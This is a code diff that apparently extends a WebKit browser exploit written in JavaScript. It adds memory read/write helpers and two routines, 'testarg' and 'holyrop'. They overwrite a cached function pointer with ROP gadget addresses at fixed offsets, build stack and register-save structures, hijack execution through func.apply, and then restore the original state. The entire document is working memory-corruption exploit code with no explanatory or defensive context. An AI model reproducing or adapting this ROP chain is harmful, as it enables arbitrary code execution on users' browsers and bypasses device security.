@@ -80,6 +80,11 @@ function doExploit(buf, stale, temp) {
 	function dumptemp(count) {
 		dump('Tem', temp, count);
 	}
+	function dumpaddr(addr, count) {
+		buf[4] = addr[0];
+		buf[5] = addr[1];
+		dumptemp(count);
+	}
 
 	var func = document.getElementById;
 	func.apply(document, ['']); // Ensure the func pointer is cached at 8:9
@@ -272,8 +277,8 @@ function doExploit(buf, stale, temp) {
 		var retaddr = add2(mainaddr, 0x3E2724); // Second gadget addr
 		var memaddr = add2(mainaddr, 0x91F328);
 		write8(retaddr, memaddr);
-		retaddr = add2(add2(curptr, -funcbase), 0x836050);
-		memaddr = add2(mainaddr, 0x91F350); // Last gadget addr (should just be `blr X27`)
+		retaddr = add2(add2(curptr, -funcbase), 0x836050); // Last gadget addr (should just be `blr X27`)
+		memaddr = add2(mainaddr, 0x91F350);
 		write8(retaddr, memaddr);
 
 		// For addresses in webkit_wkc
@@ -298,6 +303,113 @@ function doExploit(buf, stale, temp) {
 
 		return sp;
 	}
+
+	function testarg() {
+		var test = 0x39FEEC; // First gadget addr
+		var jaddr = add2(mainaddr, test);
+		log('New jump at ' + paddr(jaddr));
+		log('Assigning function pointer');
+
+		log('Function object at ' + paddr(funcaddr));
+		var curptr = read8(funcaddr, 8);
+
+		var wkcaddr = add2(curptr, -funcbase);
+
+		var retaddr = add2(wkcaddr, 0x16EA88); // Second gadget addr
+		var memaddr = add2(mainaddr, 0x91F320 + 0x8);
+		write8(retaddr, memaddr);
+		retaddr = add2(wkcaddr, 0xBDD8AC); // Third gadget addr
+		memaddr = add2(mainaddr, 0x91F320 + 0x10);
+		write8(retaddr, memaddr);
+		retaddr = add2(wkcaddr, 0x836050); // Last gadget addr (should just be `blr X27`)
+		memaddr = add2(mainaddr, 0x91F320 + 0x568);
+		write8(retaddr, memaddr);
+
+		// For addresses in webkit_wkc
+		//write8(add2(add2(curptr, -funcbase), 0x836050), funcaddr, 8);
+
+		// For addresses in app
+		write8(jaddr, funcaddr, 8);
+
+		log('Patched function address from ' + paddr(curptr) + ' to ' + paddr(read8(funcaddr, 8)));
+
+		log('Assigned.  Jumping.');
+		var ret = func.apply(0x101);
+		log('Jumped back.');
+
+		log('Output addr: ' + paddr(getAddr(ret)));
+
+		write8(curptr, funcaddr, 8);
+
+		log('Restored original function pointer.');
+	}
+
+	var allocated = {};
+	function malloc(bytes) {
+		var obj = new Uint32Array(bytes >> 2);
+		var addr = read8(getAddr(obj), 4);
+		allocated[addr] = obj;
+		return addr;
+	}
+	function free(addr) {
+		allocated[addr] = 0;
+	}
+
+	function holyrop() {
+		var sp = getSP();
+
+		function mref(off) { return add2(mainaddr, off); }
+
+		log('Starting holy rop');
+		var jaddr = mref(0x39FEEC); // First gadget addr
+		log('New jump at ' + paddr(jaddr));
+		log('Assigning function pointer');
+
+		log('Function object at ' + paddr(funcaddr));
+		var curptr = read8(funcaddr, 8);
+		write8(jaddr, funcaddr, 8);
+		log('Patched function address from ' + paddr(curptr) + ' to ' + paddr(read8(funcaddr, 8)));
+
+		log('Setting up structs');
+
+		var init = mref(0x91F320);
+		var saved = new Uint32Array(0x1000);
+		for(var i = 0; i < 0x1000; ++i)
+			saved[i] = read4(init, i);
+
+		var block1 = malloc(0x200);
+		var block2 = malloc(0x200);
+		write8(block1, init, 0);
+		write8(mref(0x4967F0), init, 2);
+		write8(mref(0x433EB4), init, 4);
+		write8(mref(0x4967F0), init, 0x18 >> 2);
+		write8(block2, init, 0x28 >> 2);
+
+		sp = add2(sp, -0x800);
+		write8(mref(0x181E9C), block1, 0x58 >> 2);
+		write8(sp, block1, 0x68 >> 2);
+
+		var regsaveblock = malloc(0x200);
+		write8(mref(0x4336b0), block2, 0x10 >> 2);
+		write8(regsaveblock, block2, 0x28 >> 2);
+
+		write8(mref(0x181E9C), sp, 0);
+
+		log('Assigned.  Jumping.');
+		func.apply(0x101);
+		log('Jumped back.');
+
+		write8(curptr, funcaddr, 8);
+
+		log('Restored original function pointer.');
+
+		for(var i = 0; i < 0x1000; ++i)
+			write4(saved[i], init, i);
+		log('Restored data page.');
+	}
+
+	holyrop();
+	return;
 
 	function callNative(addr) {
 		var sp = getSP();
